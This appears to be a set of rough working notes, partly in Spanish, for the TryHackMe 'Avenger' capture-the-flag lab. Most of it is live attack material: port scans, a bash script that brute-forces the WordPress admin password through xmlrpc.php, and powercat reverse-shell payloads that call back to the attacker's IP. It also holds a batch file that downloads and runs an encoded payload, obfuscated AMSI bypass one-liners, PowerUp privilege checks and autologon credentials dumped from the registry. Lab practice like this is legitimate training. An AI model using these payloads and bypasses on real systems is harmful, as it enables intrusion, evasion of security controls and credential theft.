https://0xb0b.gitbook.io/writeups/tryhackme/2023/avenger



https://happycamper84.medium.com/avenger-tryhackme-walkthrough-232ec1d46f9c


https://rootrecipe.medium.com/advanced-powerup-ps1-usage-ad0f6d713a9f


sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 10.201.2.142 -oN scan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-02 16:16 EDT
Nmap scan report for 10.201.2.142
Host is up (0.25s latency).
Not shown: 64795 closed tcp ports (reset), 722 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown




nmap -p135,139,3306,3389,443,445,47001,49664,49665,49666,49667,49668,49670,49671,49674,5985,7680,80 -sV -sC -Pn -vvv -n 10.201.2.142 -oN fullScan.txt 


──(kali㉿kali)-[~/Downloads/avenger]
└─$ nmap -p135,139,3306,3389,443,445,47001,49664,49665,49666,49667,49668,49670,49671,49674,5985,7680,80 -sV -sC -Pn -vvv -n 10.201.2.142 -oN fullScan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-02 16:19 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:19
Completed NSE at 16:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:19
Completed NSE at 16:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:19
Completed NSE at 16:19, 0.00s elapsed
Initiating SYN Stealth Scan at 16:19
Scanning 10.201.2.142 [18 ports]
Discovered open port 49668/tcp on 10.201.2.142
Discovered open port 80/tcp on 10.201.2.142
Discovered open port 3389/tcp on 10.201.2.142
Discovered open port 443/tcp on 10.201.2.142
Discovered open port 445/tcp on 10.201.2.142
Discovered open port 49674/tcp on 10.201.2.142
Discovered open port 135/tcp on 10.201.2.142
Discovered open port 3306/tcp on 10.201.2.142
Discovered open port 139/tcp on 10.201.2.142
Discovered open port 7680/tcp on 10.201.2.142
Discovered open port 47001/tcp on 10.201.2.142
Discovered open port 49671/tcp on 10.201.2.142
Discovered open port 49666/tcp on 10.201.2.142
Discovered open port 49665/tcp on 10.201.2.142
Discovered open port 5985/tcp on 10.201.2.142
Discovered open port 49667/tcp on 10.201.2.142
Discovered open port 49670/tcp on 10.201.2.142
Discovered open port 49664/tcp on 10.201.2.142
Completed SYN Stealth Scan at 16:19, 0.69s elapsed (18 total ports)
Initiating Service scan at 16:19
Scanning 18 services on 10.201.2.142
Service scan Timing: About 55.56% done; ETC: 16:21 (0:00:44 remaining)
Completed Service scan at 16:20, 59.23s elapsed (18 services on 1 host)
NSE: Script scanning 10.201.2.142.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 13.20s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 2.94s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
Nmap scan report for 10.201.2.142
Host is up, received user-set (0.31s latency).
Scanned at 2025-08-02 16:19:30 EDT for 76s

PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.5K  2022-06-15 16:07  applications.html
| 177   2022-06-15 16:07  bitnami.css
| -     2023-04-06 09:24  dashboard/
| 30K   2015-07-16 15:32  favicon.ico
| -     2023-06-27 09:26  gift/
| -     2023-06-27 09:04  img/
| 751   2022-06-15 16:07  img/module_table_bottom.png
| 337   2022-06-15 16:07  img/module_table_top.png
| -     2023-06-28 14:39  xampp/
|_
|_http-title: Index of /
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack ttl 125 Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.5K  2022-06-15 16:07  applications.html
| 177   2022-06-15 16:07  bitnami.css
| -     2023-04-06 09:24  dashboard/
| 30K   2015-07-16 15:32  favicon.ico
| -     2023-06-27 09:26  gift/
| -     2023-06-27 09:04  img/
| 751   2022-06-15 16:07  img/module_table_bottom.png
| 337   2022-06-15 16:07  img/module_table_top.png
| -     2023-06-28 14:39  xampp/
|_
| tls-alpn: 
|_  http/1.1
|_http-title: Index of /
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
445/tcp   open  microsoft-ds? syn-ack ttl 125
3306/tcp  open  mysql         syn-ack ttl 125 MariaDB 5.5.5-10.4.28
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.28-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
|   Some Capabilities: SupportsTransactions, IgnoreSigpipes, Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, FoundRows, ConnectWithDatabase, InteractiveClient, SupportsCompression, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, ODBCClient, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: [xl4]Y'TQ{:JFa5#M>-e
|_  Auth Plugin Name: mysql_native_password
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
|_ssl-date: 2025-08-02T20:20:43+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: GIFT
|   NetBIOS_Domain_Name: GIFT
|   NetBIOS_Computer_Name: GIFT
|   DNS_Domain_Name: gift
|   DNS_Computer_Name: gift
|   Product_Version: 10.0.17763
|_  System_Time: 2025-08-02T20:20:31+00:00
| ssl-cert: Subject: commonName=gift
| Issuer: commonName=gift
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-08-01T20:16:07
| Not valid after:  2026-01-31T20:16:07
| MD5:   9d00:d120:5430:7c4b:79d2:dbdf:cc72:c11b
| SHA-1: 470d:883d:df80:a430:30dc:de40:6ab2:a636:10dd:23bc
| -----BEGIN CERTIFICATE-----
| MIICzDCCAbSgAwIBAgIQTcfYmtVuE5NIy5xMNinKJDANBgkqhkiG9w0BAQsFADAP
| MQ0wCwYDVQQDEwRnaWZ0MB4XDTI1MDgwMTIwMTYwN1oXDTI2MDEzMTIwMTYwN1ow
| DzENMAsGA1UEAxMEZ2lmdDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| ANZo/9jSIA4/fmeW+6l0Fd/EhyX38PEeU7fbz+0vNpvqXrKYxGE/zAEZjhohAY+o
| mln09YW+lCR18DUDTlrg/2Ck1ihSSHaz2pCHI4RqDVQVYMo6wa5PMk4+B2yuZgJE
| o6yTt6Wgo1qjaxI6mS3V2YrH3l6Kl1ffFSIu50y6DnxwvQGOhVkIG7/fsBMYQQxK
| stxsueu7i064x+YW5EQTTR0QsIgiFPT2LJXhsBzPS5He/PhyV2OjhFxKSdL7IaZp
| 0QX/d5ZPWgmIQFm0w4dNjZOF04T6WRjrL+u++2dI3uLK8x+OPk7yihikVIii+yui
| Opwj00Xt0lquxIZiw78Xui0CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEw
| CwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQBdpI+MhDU1/clvrmQHfxcV
| Zq915iczTFOT8ZvQwmF7i+QctzuW2NLCAfTGp35ZP1oD5fts37Ef332BkSaMv5MS
| LELb9D5Yg2gpFuanBiJ4ddCamhEgMolAjJqWuDK9FCDo5jsAZkMP0tjOeTfxN6Mn
| FYnXs39O0+KEcrqAZnBXpdqTeWywLdRnbq5Uh1hm0+etDkHKtzuby7Ef9o23+5Hf
| AnisUtGueLUBmiRoXnAWR+N9SgB3PthIA4EfOXIxFW6sAR20ntYXr1yQDarOO0Pm
| ZjpymL9HqxWnnMYmPaU2VGdRH1pyDzFhBbFzaAQPWujPRiNktxluzM1OaBzTsofN
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?    syn-ack ttl 125
47001/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Service Info: Hosts: localhost, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 29756/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 64159/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38327/udp): CLEAN (Timeout)
|   Check 4 (port 13419/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-02T20:20:31
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.50 seconds
           Raw packets sent: 18 (792B) | Rcvd: 18 (792B)





gobuster dir -u http://10.201.2.142 -w /usr/share/wordlists/dirb/common.txt

gobuster dir -u http://10.201.2.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,zip -t 50



gobuster dir -u http://avenger.tryhackme/gift -w /usr/share/wordlists/dirb/common.txt




dirb http://10.201.2.142 /usr/share/wordlists/dirb/common.txt

gobuster dir -u http://10.201.2.142 -w /usr/share/wordlists/dirb/common.txt

ffuf -w /usr/share/wordlists/wfuzz/general/big.txt -u http://10.201.2.142/FUZZ -fw 1

nikto -h 10.201.2.142




wpscan --url http://avenger.tryhackme/gift/ --enumerate p




START /B powershell -c "IEX (New-Object System.Net.WebClient).DownloadString('http://10.8.163.249:4455/Avenger.txt')"


wpscan --url https://avenger.tryhackme/ --enumerate u



user

Mike Rich
Jenny Smith
George Doe
Maria Jay





└─$ whatweb http://avenger.tryhackme/gift/
http://avenger.tryhackme/gift/ [200 OK] Apache[2.4.56], Country[RESERVED][ZZ], Email[contact@example.com,john@doe.com,office@example.com], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28], IP[10.201.2.142], JQuery[3.6.4], MetaGenerator[WordPress 6.2.2], OpenSSL[1.1.1t], PHP[8.0.28], Script[text/javascript], Title[AVenger], UncommonHeaders[link], WordPress[6.2.2], X-Powered-By[PHP/8.0.28]








# Crear un archivo .bat





LHOST=10.8.163.249
LPORT=9999
rshell="Avenger.txt"
pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > /home/kali/Downloads/THM/$rshell
This encodes the pow








┌──(kali㉿kali)-[~/Downloads/avenger]
└─$ cat file.xml                                                          
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>





-------------------------------------------------------------


#!/bin/bash

# Ctrl + C
trap ctrl_c SIGINT

function ctrl_c(){
    echo -e "\n\n[!] Saliendo..."
    exit 1
}

function createXML(){
    password=$1

    xmlFile="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>$password</value></param>
  </params>
</methodCall>"

    echo $xmlFile > file4.xml

    response=$(curl -s -X POST "http://avenger.tryhackme/gift/xmlrpc.php" -d@file4.xml -d@file.xml)

    if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
        echo -e "\n[+] La contraseña para el usuario admin es $password"
        exit 0
    fi

}

# Leer cada contraseña del wordlist y probarla
cat /usr/share/wordlists/rockyou.txt | while read password; do
  createXML $password
done












https://github.com/besimorhino/powercat


 LHOST=10.8.211.1
                                                                        
┌──(0xb0b㉿kali)-[~/Documents/tryhackme/avenger]
└─$ LPORT=49731
                                                                        
┌──(0xb0b㉿kali)-[~/Documents/tryhackme/avenger]
└─$ rshell=shell-49731.txt


└─$ pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > /home/0xb0b/Documents/tryhackme/avenger/$rshell




# Crear el archivo

pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 10.8.163.249 -p 1234 -e cmd.exe -ge" > /home/kali/Downloads/avenger/shell.txt


┌──(kali㉿kali)-[~/Downloads/avenger]
└─$ nano exp.bat



START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://10.8.163.249:8000/shell.txt');iex 'powershell -E $code'



└─$ python3 -m http.server  -b ip




nc -lnvp 1234



Escalada de privilegios
Durante el proceso de enumeración, vemos que hugo es parte de los grupos de administradores, genial. Comprobemos si UAC está presente. Quizás podamos evitarlo. Como afirma Microsoft, el control de cuentas de usuario es una función de seguridad que requiere el consentimiento del usuario antes de ejecutar aplicaciones con privilegios de administrador.


C:\Users\hugo\Desktop>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                        
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only                          
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only                          
BUILTIN\Remote Desktop Users                                  Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users                               Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192                                                    

C:\Users\hugo\Desktop>









# Consultamos si UAC está habilitado. Los ajustes están al nivel5(predeterminado). Le pedirá al administrador que confirme que debe ejecutar binarios que no sean de Windows con privilegios altos.

REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin






C:\Users\hugo\Desktop>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5


C:\Users\hugo\Desktop>



https://rootrecipe.medium.com/advanced-powerup-ps1-usage-ad0f6d713a9f


powershell -ep bypass

curl -u http://10.8.163.249:8000/shell.php -o C:\xampp\htdocs\shell.php 




PS C:\> powershell -ep bypass

So now that we have bypassed PowerShell’s execution policy, we need to disable AMSI. Below is a good bypass for AMSI that hasn’t been patched by Microsoft yet. Type this into the PowerShell console to bypass AMSI. There are several others out there, but this is my go-to:

sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

Running PowerUp.ps1

Now comes the fun part. We have disabled different protections so now we should be able to run our script with no problems. Before we can just run the program, we need to import the program into the current session. We do this by running one of the following commands:

PS C:\> Import-Module PowerUp.ps1PS C:\> . .\PowerUp.ps1





AMSI Bypass Methods





[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)





https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1






(New-Object System.Net.Webclient).DownloadString('http://10.8.163.249:8000/PowerUp.ps1') > PowerUp.ps1


. ./Powerup.ps1


Invoke-AllChecks




CRedenciales de HUGO


reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"




[*] Checking for Autologon credentials in registry...


DefaultDomainName    : 
DefaultUserName      : hugo
DefaultPassword      : SurpriseMF123!
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   : 





xfreerdp /u:guho /p:SurpriseMF123! /v:10.201.2.142 /dynamic-resolution




THM{I_CAN_DO_THIS_ALL_DAY}